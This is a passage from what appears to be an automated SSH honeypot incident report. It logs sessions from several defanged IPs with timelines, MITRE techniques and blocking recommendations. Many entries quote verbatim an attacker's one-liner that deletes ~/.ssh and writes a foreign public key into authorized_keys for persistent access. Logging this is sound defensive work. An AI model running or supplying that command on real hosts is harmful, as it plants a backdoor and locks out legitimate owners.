| Time (UTC) | Event |
|---|---|
| `2026-05-22 15:15:01` | `cowrie.session.connect` |
| `2026-05-22 15:15:01` | `cowrie.client.version` |
| `2026-05-22 15:15:02` | `cowrie.client.kex` |
| `2026-05-22 15:15:03` | `cowrie.login.success` |
| `2026-05-22 15:15:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `102.88.137[.]145` to AbuseIPDB if not already reported
- [ ] Block `102.88.137[.]145` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-30957eb0e78d

| Field | Detail |
|---|---|
| **Source IP** | `186.103.169[.]12` |
| **First Seen** | 2026-05-22 15:19 |
| **Last Seen** | 2026-05-22 15:19 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-22 15:19:11` | `cowrie.session.connect` |
| `2026-05-22 15:19:11` | `cowrie.client.version` |
| `2026-05-22 15:19:11` | `cowrie.client.kex` |
| `2026-05-22 15:19:12` | `cowrie.login.success` |
| `2026-05-22 15:19:13` | `cowrie.session.params` |
| `2026-05-22 15:19:13` | `cowrie.command.input` |
| `2026-05-22 15:19:13` | `cowrie.command.failed` |
| `2026-05-22 15:19:14` | `cowrie.log.closed` |
| `2026-05-22 15:19:14` | `cowrie.session.params` |
| `2026-05-22 15:19:14` | `cowrie.command.input` |
| `2026-05-22 15:19:15` | `cowrie.session.file_download` |
| `2026-05-22 15:19:15` | `cowrie.log.closed` |
| `2026-05-22 15:19:21` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `186.103.169[.]12` to AbuseIPDB if not already reported
- [ ] Block `186.103.169[.]12` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ec8d67d6278b

| Field | Detail |
|---|---|
| **Source IP** | `186.103.169[.]12` |
| **First Seen** | 2026-05-22 15:19 |
| **Last Seen** | 2026-05-22 15:19 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-22 15:19:18` | `cowrie.session.connect` |
| `2026-05-22 15:19:18` | `cowrie.client.version` |
| `2026-05-22 15:19:19` | `cowrie.client.kex` |
| `2026-05-22 15:19:20` | `cowrie.login.success` |
| `2026-05-22 15:19:21` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `186.103.169[.]12` to AbuseIPDB if not already reported
- [ ] Block `186.103.169[.]12` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-12a716a65631

| Field | Detail |
|---|---|
| **Source IP** | `186.96.151[.]198` |
| **First Seen** | 2026-05-22 15:23 |
| **Last Seen** | 2026-05-22 15:23 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-22 15:23:39` | `cowrie.session.connect` |
| `2026-05-22 15:23:39` | `cowrie.client.version` |
| `2026-05-22 15:23:39` | `cowrie.client.kex` |
| `2026-05-22 15:23:40` | `cowrie.login.success` |
| `2026-05-22 15:23:41` | `cowrie.session.params` |
| `2026-05-22 15:23:41` | `cowrie.command.input` |
| `2026-05-22 15:23:41` | `cowrie.command.failed` |
| `2026-05-22 15:23:41` | `cowrie.log.closed` |
| `2026-05-22 15:23:42` | `cowrie.session.params` |
| `2026-05-22 15:23:42` | `cowrie.command.input` |
| `2026-05-22 15:23:42` | `cowrie.session.file_download` |
| `2026-05-22 15:23:42` | `cowrie.log.closed` |
| `2026-05-22 15:23:47` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `186.96.151[.]198` to AbuseIPDB if not already reported
- [ ] Block `186.96.151[.]198` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6ca3a2baea71

| Field | Detail |
|---|---|
| **Source IP** | `186.103.169[.]12` |
| **First Seen** | 2026-05-22 15:23 |
| **Last Seen** | 2026-05-22 15:23 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-22 15:23:41` | `cowrie.session.connect` |
| `2026-05-22 15:23:41` | `cowrie.client.version` |
| `2026-05-22 15:23:41` | `cowrie.client.kex` |
| `2026-05-22 15:23:43` | `cowrie.login.success` |
| `2026-05-22 15:23:44` | `cowrie.session.params` |
| `2026-05-22 15:23:44` | `cowrie.command.input` |
| `2026-05-22 15:23:44` | `cowrie.command.failed` |
| `2026-05-22 15:23:44` | `cowrie.log.closed` |
| `2026-05-22 15:23:45` | `cowrie.session.params` |
| `2026-05-22 15:23:45` | `cowrie.command.input` |
| `2026-05-22 15:23:45` | `cowrie.session.file_download` |
| `2026-05-22 15:23:45` | `cowrie.log.closed` |
| `2026-05-22 15:23:51` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `186.103.169[.]12` to AbuseIPDB if not already reported
- [ ] Block `186.103.169[.]12` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-071c3d3f11f9

| Field | Detail |
|---|---|
| **Source IP** | `186.96.151[.]198` |
| **First Seen** | 2026-05-22 15:23 |
| **Last Seen** | 2026-05-22 15:23 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-22 15:23:45` | `cowrie.session.connect` |
| `2026-05-22 15:23:45` | `cowrie.client.version` |
| `2026-05-22 15:23:45` | `cowrie.client.kex` |
| `2026-05-22 15:23:46` | `cowrie.login.success` |
| `2026-05-22 15:23:47` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `186.96.151[.]198` to AbuseIPDB if not already reported
- [ ] Block `186.96.151[.]198` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1a09f2916976

| Field | Detail |
|---|---|
| **Source IP** | `186.103.169[.]12` |
| **First Seen** | 2026-05-22 15:23 |
| **Last Seen** | 2026-05-22 15:23 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-22 15:23:49` | `cowrie.session.connect` |
| `2026-05-22 15:23:49` | `cowrie.client.version` |
| `2026-05-22 15:23:49` | `cowrie.client.kex` |
| `2026-05-22 15:23:51` | `cowrie.login.success` |
| `2026-05-22 15:23:51` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `186.103.169[.]12` to AbuseIPDB if not already reported
- [ ] Block `186.103.169[.]12` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-52320a361596

| Field | Detail |
|---|---|
| **Source IP** | `103.26.136[.]173` |
| **First Seen** | 2026-05-22 15:26 |
| **Last Seen** | 2026-05-22 15:26 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-22 15:26:31` | `cowrie.session.connect` |
| `2026-05-22 15:26:31` | `cowrie.client.version` |
| `2026-05-22 15:26:31` | `cowrie.client.kex` |
| `2026-05-22 15:26:32` | `cowrie.login.success` |
| `2026-05-22 15:26:32` | `cowrie.session.params` |
| `2026-05-22 15:26:32` | `cowrie.command.input` |
| `2026-05-22 15:26:32` | `cowrie.command.failed` |
| `2026-05-22 15:26:32` | `cowrie.log.closed` |
| `2026-05-22 15:26:32` | `cowrie.session.params` |
| `2026-05-22 15:26:32` | `cowrie.command.input` |
| `2026-05-22 15:26:32` | `cowrie.session.file_download` |
| `2026-05-22 15:26:32` | `cowrie.log.closed` |
| `2026-05-22 15:26:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.26.136[.]173` to AbuseIPDB if not already reported
- [ ] Block `103.26.136[.]173` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b2a08b927911

| Field | Detail |
|---|---|
| **Source IP** | `103.26.136[.]173` |
| **First Seen** | 2026-05-22 15:26 |
| **Last Seen** | 2026-05-22 15:26 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-22 15:26:33` | `cowrie.session.connect` |
| `2026-05-22 15:26:33` | `cowrie.client.version` |
| `2026-05-22 15:26:33` | `cowrie.client.kex` |
| `2026-05-22 15:26:34` | `cowrie.login.success` |
| `2026-05-22 15:26:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.26.136[.]173` to AbuseIPDB if not already reported
- [ ] Block `103.26.136[.]173` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-47b1e4e5a0e8

| Field | Detail |
|---|---|
| **Source IP** | `81.9.145[.]130` |
| **First Seen** | 2026-05-22 15:30 |
| **Last Seen** | 2026-05-22 15:30 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-22 15:30:31` | `cowrie.session.connect` |
| `2026-05-22 15:30:31` | `cowrie.client.version` |
| `2026-05-22 15:30:31` | `cowrie.client.kex` |
| `2026-05-22 15:30:32` | `cowrie.login.success` |
| `2026-05-22 15:30:32` | `cowrie.session.params` |
| `2026-05-22 15:30:32` | `cowrie.command.input` |
| `2026-05-22 15:30:32` | `cowrie.command.failed` |
| `2026-05-22 15:30:33` | `cowrie.log.closed` |
| `2026-05-22 15:30:33` | `cowrie.session.params` |
| `2026-05-22 15:30:33` | `cowrie.command.input` |
| `2026-05-22 15:30:33` | `cowrie.session.file_download` |
| `2026-05-22 15:30:33` | `cowrie.log.closed` |
| `2026-05-22 15:30:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `81.9.145[.]130` to AbuseIPDB if not already reported
- [ ] Block `81.9.145[.]130` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-17269146ba6c

| Field | Detail |
|---|---|
| **Source IP** | `186.96.151[.]198` |
| **First Seen** | 2026-05-22 15:30 |
| **Last Seen** | 2026-05-22 15:30 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-22 15:30:35` | `cowrie.session.connect` |
| `2026-05-22 15:30:35` | `cowrie.client.version` |
| `2026-05-22 15:30:35` | `cowrie.client.kex` |
| `2026-05-22 15:30:36` | `cowrie.login.success` |
| `2026-05-22 15:30:37` | `cowrie.session.params` |
| `2026-05-22 15:30:37` | `cowrie.command.input` |
| `2026-05-22 15:30:37` | `cowrie.command.failed` |
| `2026-05-22 15:30:37` | `cowrie.log.closed` |
| `2026-05-22 15:30:38` | `cowrie.session.params` |
| `2026-05-22 15:30:38` | `cowrie.command.input` |
| `2026-05-22 15:30:38` | `cowrie.session.file_download` |
| `2026-05-22 15:30:38` | `cowrie.log.closed` |
| `2026-05-22 15:30:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `186.96.151[.]198` to AbuseIPDB if not already reported
- [ ] Block `186.96.151[.]198` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9052b329b112

| Field | Detail |
|---|---|
| **Source IP** | `81.9.145[.]130` |
| **First Seen** | 2026-05-22 15:30 |
| **Last Seen** | 2026-05-22 15:30 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-22 15:30:36` | `cowrie.session.connect` |
| `2026-05-22 15:30:36` | `cowrie.client.version` |
| `2026-05-22 15:30:36` | `cowrie.client.kex` |
| `2026-05-22 15:30:37` | `cowrie.login.success` |
| `2026-05-22 15:30:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `81.9.145[.]130` to AbuseIPDB if not already reported
- [ ] Block `81.9.145[.]130` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9e102164fb19

| Field | Detail |
|---|---|
| **Source IP** | `186.96.151[.]198` |
| **First Seen** | 2026-05-22 15:30 |
| **Last Seen** | 2026-05-22 15:30 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-22 15:30:41` | `cowrie.session.connect` |
| `2026-05-22 15:30:41` | `cowrie.client.version` |
| `2026-05-22 15:30:42` | `cowrie.client.kex` |
| `2026-05-22 15:30:43` | `cowrie.login.success` |
| `2026-05-22 15:30:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `186.96.151[.]198` to AbuseIPDB if not already reported
- [ ] Block `186.96.151[.]198` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-876bb236b81f

| Field | Detail |
|---|---|
| **Source IP** | `186.103.169[.]12` |
| **First Seen** | 2026-05-22 15:32 |
| **Last Seen** | 2026-05-22 15:32 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-22 15:32:38` | `cowrie.session.connect` |
| `2026-05-22 15:32:38` | `cowrie.client.version` |
| `2026-05-22 15:32:38` | `cowrie.client.kex` |
| `2026-05-22 15:32:39` | `cowrie.login.success` |
| `2026-05-22 15:32:40` | `cowrie.session.params` |
| `2026-05-22 15:32:40` | `cowrie.command.input` |
| `2026-05-22 15:32:40` | `cowrie.command.failed` |
| `2026-05-22 15:32:41` | `cowrie.log.closed` |
| `2026-05-22 15:32:41` | `cowrie.session.params` |
| `2026-05-22 15:32:41` | `cowrie.command.input` |
| `2026-05-22 15:32:41` | `cowrie.session.file_download` |
| `2026-05-22 15:32:41` | `cowrie.log.closed` |
| `2026-05-22 15:32:47` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `186.103.169[.]12` to AbuseIPDB if not already reported
- [ ] Block `186.103.169[.]12` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-031c479afd14

| Field | Detail |
|---|---|
| **Source IP** | `186.103.169[.]12` |
| **First Seen** | 2026-05-22 15:32 |
| **Last Seen** | 2026-05-22 15:32 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-22 15:32:45` | `cowrie.session.connect` |
| `2026-05-22 15:32:45` | `cowrie.client.version` |
| `2026-05-22 15:32:46` | `cowrie.client.kex` |
| `2026-05-22 15:32:47` | `cowrie.login.success` |
| `2026-05-22 15:32:47` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `186.103.169[.]12` to AbuseIPDB if not already reported
- [ ] Block `186.103.169[.]12` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5f3effd72b90

| Field | Detail |
|---|---|
| **Source IP** | `186.96.151[.]198` |
| **First Seen** | 2026-05-22 15:41 |
| **Last Seen** | 2026-05-22 15:41 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-22 15:41:01` | `cowrie.session.connect` |
| `2026-05-22 15:41:01` | `cowrie.client.version` |
| `2026-05-22 15:41:02` | `cowrie.client.kex` |
| `2026-05-22 15:41:03` | `cowrie.login.success` |
| `2026-05-22 15:41:03` | `cowrie.session.params` |
| `2026-05-22 15:41:03` | `cowrie.command.input` |
| `2026-05-22 15:41:03` | `cowrie.command.failed` |
| `2026-05-22 15:41:04` | `cowrie.log.closed` |
| `2026-05-22 15:41:04` | `cowrie.session.params` |
| `2026-05-22 15:41:04` | `cowrie.command.input` |
| `2026-05-22 15:41:05` | `cowrie.session.file_download` |
| `2026-05-22 15:41:05` | `cowrie.log.closed` |
| `2026-05-22 15:41:09` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `186.96.151[.]198` to AbuseIPDB if not already reported
- [ ] Block `186.96.151[.]198` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-028a811e0aa4

| Field | Detail |
|---|---|
| **Source IP** | `81.9.145[.]130` |
| **First Seen** | 2026-05-22 15:41 |
| **Last Seen** | 2026-05-22 15:41 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-22 15:41:02` | `cowrie.session.connect` |
| `2026-05-22 15:41:02` | `cowrie.client.version` |
| `2026-05-22 15:41:02` | `cowrie.client.kex` |
| `2026-05-22 15:41:03` | `cowrie.login.success` |
| `2026-05-22 15:41:04` | `cowrie.session.params` |
| `2026-05-22 15:41:04` | `cowrie.command.input` |
| `2026-05-22 15:41:04` | `cowrie.command.failed` |
| `2026-05-22 15:41:04` | `cowrie.log.closed` |
